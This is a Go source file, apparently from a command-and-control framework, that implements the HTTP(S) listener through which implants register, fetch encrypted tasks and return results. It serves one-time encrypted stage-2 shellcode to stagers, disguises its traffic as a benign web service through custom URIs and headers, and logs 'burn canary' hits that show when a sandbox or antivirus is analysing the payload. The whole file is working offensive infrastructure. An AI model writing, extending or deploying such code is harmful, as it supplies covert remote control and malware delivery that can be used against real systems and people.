package server

import (
	"github.com/user/wisp/internal/plugin"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/user/wisp/internal/db"
)

// HTTPListener implements a polling-based HTTP(S) C2 channel.
//
// Endpoints:
//
//	POST /api/v1/register  body: {"payload":"<base64 mixed-encrypted registration>"}
//	                       resp: {"status":"ok","ack":"<base64 AES-encrypted ack>"}
//	POST /api/v1/checkin   body: {"id":"<agentID>","data":"<base64 AES-encrypted results>"}
//	                       resp: {"tasks":"<base64 AES-encrypted pending tasks>"}
type HTTPListener struct {
	mu      sync.Mutex
	id      string
	config  *db.ListenerRow
	server  *Server
	httpSrv *http.Server
	ln      net.Listener
	running bool
	stopCh  chan struct{}
}

type httpRegisterRequest struct {
	Payload string `json:"payload"` // base64 of hybrid-encrypted registration
}

type httpRegisterResponse struct {
	Status string `json:"status"`
	ID     string `json:"id,omitempty"`
	Ack    string `json:"ack,omitempty"` // base64 of AES-encrypted ack
}

type httpCheckinRequest struct {
	ID   string `json:"id"`
	Seq  uint64 `json:"seq"`  // monotonic counter for replay protection
	Data string `json:"data"` // base64 of AES-encrypted results (may be empty)
}

type httpCheckinResponse struct {
	Tasks string `json:"tasks"` // base64 of AES-encrypted pending tasks
}

// newHTTPListener creates a new HTTP/HTTPS listener bound to the given config.
func newHTTPListener(s *Server, config *db.ListenerRow) *HTTPListener {
	return &HTTPListener{
		id:     config.ID,
		config: config,
		server: s,
		stopCh: make(chan struct{}),
	}
}

// ID returns the listener ID.
func (hl *HTTPListener) ID() string {
	return hl.id
}

// Config returns the listener configuration.
func (hl *HTTPListener) Config() *db.ListenerRow {
	return hl.config
}

// IsRunning reports whether the listener is currently running.
func (hl *HTTPListener) IsRunning() bool {
	hl.mu.Lock()
	defer hl.mu.Unlock()
	return hl.running
}

// Start begins serving the HTTP C2 endpoints.
func (hl *HTTPListener) Start() error {
	hl.mu.Lock()
	defer hl.mu.Unlock()

	if hl.running {
		return fmt.Errorf("listener %s already running", hl.id)
	}

	config := hl.config
	addr := fmt.Sprintf("%s:%d", config.BindHost, config.BindPort)

	// Malleable profile: optional custom URIs + response headers so the
	// listener imitates a benign web service.
	prof := config.MalleableProfile()
	registerURI := firstNonEmpty(prof.RegisterURI, "/api/v1/register")
	checkinURI := firstNonEmpty(prof.CheckinURI, "/api/v1/checkin")
	pubkeyURI := firstNonEmpty(prof.PubKeyURI, "/api/v1/pubkey")
	stagePrefix := firstNonEmpty(prof.StagePrefix, "/stage/")

	mux := http.NewServeMux()
	// Apply profile response headers to every response via a wrapping handler.
	wrapHeaders := func(h http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			for k, v := range prof.ResponseHeaders {
				w.Header().Set(k, v)
			}
			h(w, r)
		}
	}
	mux.HandleFunc(registerURI, wrapHeaders(hl.handleRegister))
	mux.HandleFunc(checkinURI, wrapHeaders(hl.handleCheckin))
	// Agents without a compiled-in key fetch the RSA public key here first.
	mux.HandleFunc(pubkeyURI, wrapHeaders(hl.handlePubKey))
	// Staged payload download: <stagePrefix><token> returns the encrypted
	// stage-2 shellcode for a stager. Tokens are one-time and expire.
	mux.HandleFunc(stagePrefix, wrapHeaders(hl.handleStage))
	// Burn canary: /canary/<token> is hit by an agent's startup lookup. When a
	// sandbox/AV dynamically analyses the payload, this reveals it.
 	mux.HandleFunc("/canary/", wrapHeaders(hl.handleCanary))
 	// Lightweight health check for connectivity validation
 	mux.HandleFunc("/api/v1/ping", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
 		w.WriteHeader(http.StatusOK)
 		w.Write([]byte(`{"status":"ok"}`))
 	})
 	// Plugin registry listing (server-side capability manifests)
 	mux.HandleFunc("/api/v1/plugins", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(map[string]any{
 			"plugins": plugin.Default().List(),
 			"loaded":  plugin.Default().Loaded(),
 		})
 	})

	hl.httpSrv = &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
	}

	var ln net.Listener
	var err error
	if config.UseTLS {
		ln, err = hl.listenTLS(addr)
	} else {
		ln, err = net.Listen("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("http listen: %w", err)
	}

	hl.ln = ln
	hl.running = true
	hl.stopCh = make(chan struct{})

	go func() {
		err := hl.httpSrv.Serve(ln)
		select {
		case <-hl.stopCh:
			// expected shutdown
		default:
			if err != nil && err != http.ErrServerClosed {
				log.Printf("[HTTPListener] Serve error: %v", err)
			}
		}
	}()

	log.Printf("[HTTPListener] Listening on %s (TLS: %v)", addr, config.UseTLS)
	return nil
}

// Stop shuts down the HTTP server.
func (hl *HTTPListener) Stop() {
	hl.mu.Lock()
	defer hl.mu.Unlock()

	if !hl.running {
		return
	}
	hl.running = false
	close(hl.stopCh)
	if hl.httpSrv != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = hl.httpSrv.Shutdown(ctx)
	}
	if hl.ln != nil {
		hl.ln.Close()
	}
}

func (hl *HTTPListener) listenTLS(addr string) (net.Listener, error) {
	tlsCert, err := hl.server.loadOrGenerateTLSCert()
	if err != nil {
		return nil, fmt.Errorf("load TLS cert: %w", err)
	}
	config := &tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		MinVersion:   tls.VersionTLS12,
	}
	return tls.Listen("tcp", addr, config)
}

// handlePubKey serves the server's RSA public key so key-less agents can
// bootstrap registration. The PEM is public, so it is returned unencrypted.
func (hl *HTTPListener) handlePubKey(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	resp := map[string]string{"pubkey": string(hl.server.GetRSAPublicKeyPEM())}
	_ = json.NewEncoder(w).Encode(resp)
}

func (hl *HTTPListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if !hl.server.allowConn(remoteAddrIP(r.RemoteAddr)) {
		writeJSONError(w, http.StatusTooManyRequests, "rate limited")
		return
	}
	defer hl.server.releaseConn()

	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}

	// Pre-hook: let scripts observe/rewrite the registration request and
	// response (custom headers, status) before we process it.
	input := map[string]any{
		"ip":         remoteAddrIP(r.RemoteAddr),
		"method":     r.Method,
		"path":       r.URL.Path,
		"user_agent": r.UserAgent(),
		"body_bytes": 0,
	}
	// Allow large chunked payloads (download/upload results); 1MB blocks are
	// base64-expanded, so 16MB keeps headroom for a full checkin batch.
	const maxBody = 16 << 20
	var req httpRegisterRequest
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, maxBody)).Decode(&req); err != nil {
		writeJSONError(w, http.StatusBadRequest, "invalid request body")
		return
	}
	input["agent_id"] = ""
	input["body_bytes"] = len(req.Payload)

	hctx := TriggerHook("listener:register", HookPre, input, map[string]any{})
	if hctx.Abort {
		applyHookResponse(w, hctx, http.StatusForbidden)
		return
	}

	encPayload, err := base64.StdEncoding.DecodeString(req.Payload)
	if err != nil {
		writeJSONError(w, http.StatusBadRequest, "invalid payload encoding")
		return
	}

	remoteIP := remoteAddrIP(r.RemoteAddr)

	_, encrypted, err := hl.server.processRegistration(encPayload, hl.id, remoteIP)
	if err != nil {
		log.Printf("[HTTPListener] Registration rejected from %s: %v", r.RemoteAddr, err)
		writeJSONError(w, http.StatusUnauthorized, "registration rejected")
		return
	}

	resp := httpRegisterResponse{
		Status: "ok",
		Ack:    base64.StdEncoding.EncodeToString(encrypted),
	}
	json.NewEncoder(w).Encode(resp)
}

func (hl *HTTPListener) handleCheckin(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if !hl.server.allowConn(remoteAddrIP(r.RemoteAddr)) {
		writeJSONError(w, http.StatusTooManyRequests, "rate limited")
		return
	}
	defer hl.server.releaseConn()

	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}

	const maxBody = 16 << 20
	var req httpCheckinRequest
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, maxBody)).Decode(&req); err != nil {
		writeJSONError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Pre-hook on the checkin path — the primary traffic-shaping hook point.
	// Scripts can rewrite the response headers per checkin to look like a
	// benign web service, or abort the session. The full request headers are
	// exposed as input["headers"] so hooks can inspect/rotate them.
	hdr := map[string]any{}
	for k := range r.Header {
		hdr[k] = strings.Join(r.Header.Values(k), ",")
	}
	hctx := TriggerHook("listener:checkin", HookPre, map[string]any{
		"ip":         remoteAddrIP(r.RemoteAddr),
		"method":     r.Method,
		"path":       r.URL.Path,
		"user_agent": r.UserAgent(),
		"agent_id":   req.ID,
		"seq":        req.Seq,
		"body_bytes": len(req.Data),
		"headers":    hdr,
	}, map[string]any{})
	if hctx.Abort {
		applyHookResponse(w, hctx, http.StatusForbidden)
		return
	}

	var encryptedBody []byte
	if req.Data != "" {
		var err error
		encryptedBody, err = base64.StdEncoding.DecodeString(req.Data)
		if err != nil {
			writeJSONError(w, http.StatusBadRequest, "invalid data encoding")
			return
		}
	}

	encryptedTasks, err := hl.server.processCheckin(req.ID, req.Seq, encryptedBody)
	if err != nil {
		log.Printf("[HTTPListener] Checkin failed for %s: %v", req.ID, err)
		writeJSONError(w, http.StatusUnauthorized, "checkin rejected")
		return
	}

	// Post-hook: scripts may rewrite the checkin response (e.g. pad the body,
	// add headers) after processing.
	output := map[string]any{
		"tasks_b64": base64.StdEncoding.EncodeToString(encryptedTasks),
		"status":    "ok",
	}
	phctx := TriggerHook("listener:checkin", HookPost, nil, output)
	applyHookResponse(w, phctx, http.StatusOK)

	resp := httpCheckinResponse{
		Tasks: base64.StdEncoding.EncodeToString(encryptedTasks),
	}
	if t, ok := phctx.Output["tasks_b64"].(string); ok && t != "" {
		resp.Tasks = t
	}
	json.NewEncoder(w).Encode(resp)
}

// handleStage serves a one-time encrypted stage-2 payload for a stager.
// Default: JSON envelope {"data": "<base64>"} for the Go stager.
// With ?raw=1: raw encrypted bytes (Content-Type: application/octet-stream)
// for the tiny position-independent C stager.
func (hl *HTTPListener) handleStage(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}
	// The registered prefix may be customized by the Malleable profile; strip
	// whichever prefix the mux matched (its trailing "/").
	prefix := "/stage/"
	if hl.config != nil {
		if p := hl.config.MalleableProfile().StagePrefix; p != "" {
			prefix = p
		}
	}
	token := strings.TrimPrefix(r.URL.Path, prefix)
	if token == "" || strings.Contains(token, "/") {
		writeJSONError(w, http.StatusNotFound, "not found")
		return
	}
	raw := r.URL.Query().Get("raw") == "1"

	// Pre-hook: observe the stager's stage-2 download (first contact of a
	// staged payload). The stage is encrypted on the wire, so hooks see the
	// token/ip/format/size, not plaintext.
	hctx := TriggerHook("listener:stage", HookPre, map[string]any{
		"ip":         remoteAddrIP(r.RemoteAddr),
		"token":      token,
		"raw":        raw,
		"path":       r.URL.Path,
		"user_agent": r.UserAgent(),
	}, map[string]any{})
	if hctx.Abort {
		writeJSONError(w, http.StatusForbidden, "blocked")
		return
	}

	if raw {
		w.Header().Set("Content-Type", "application/octet-stream")
		_, data, ok := hl.server.ConsumeStageRaw(token)
		if !ok {
			writeJSONError(w, http.StatusNotFound, "stage not found")
			return
		}
		// Post-hook: expose the encrypted stage size (encrypted, not plaintext).
		phctx := TriggerHook("listener:stage", HookPost, nil, map[string]any{
			"token": token, "raw": raw, "encrypted_bytes": len(data),
		})
		_ = phctx
		w.Write(data)
		return
	}
	// Consume is one-time: a second fetch yields nothing.
	_, encB64, ok := hl.server.ConsumeStage(token)
	if !ok {
		writeJSONError(w, http.StatusNotFound, "stage not found")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"data": encB64})
}

// handleCanary records a burn-detection hit. Returns 200 with an empty body so
// the agent's fire-and-forget lookup is cheap and silent.
func (hl *HTTPListener) handleCanary(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	token := strings.TrimPrefix(r.URL.Path, "/canary/")
	if token == "" || strings.Contains(token, "/") {
		writeJSONError(w, http.StatusNotFound, "not found")
		return
	}
	hl.server.RecordCanaryBurn(token, remoteAddrIP(r.RemoteAddr))
	w.WriteHeader(http.StatusOK)
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

func remoteAddrIP(remoteAddr string) string {
	host, _, err := net.SplitHostPort(remoteAddr)
	if err != nil {
		return strings.TrimSpace(remoteAddr)
	}
	return host
}

// applyHookResponse applies the custom headers / status that a hook requested
// onto the HTTP response writer. defaultStatus is used when the hook did not
// specify one. It is best-effort: invalid types are ignored.
func applyHookResponse(w http.ResponseWriter, ctx *HookContext, defaultStatus int) {
	if ctx == nil {
		w.WriteHeader(defaultStatus)
		return
	}
	if hs, ok := ctx.Output["response_headers"].(map[string]any); ok {
		for k, v := range hs {
			if s, ok := v.(string); ok {
				w.Header().Set(k, s)
			}
		}
	}
	status := defaultStatus
	if s, ok := ctx.Output["status"].(float64); ok {
		status = int(s)
	}
	w.WriteHeader(status)
}

func writeJSONError(w http.ResponseWriter, code int, msg string) {
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": msg})
}
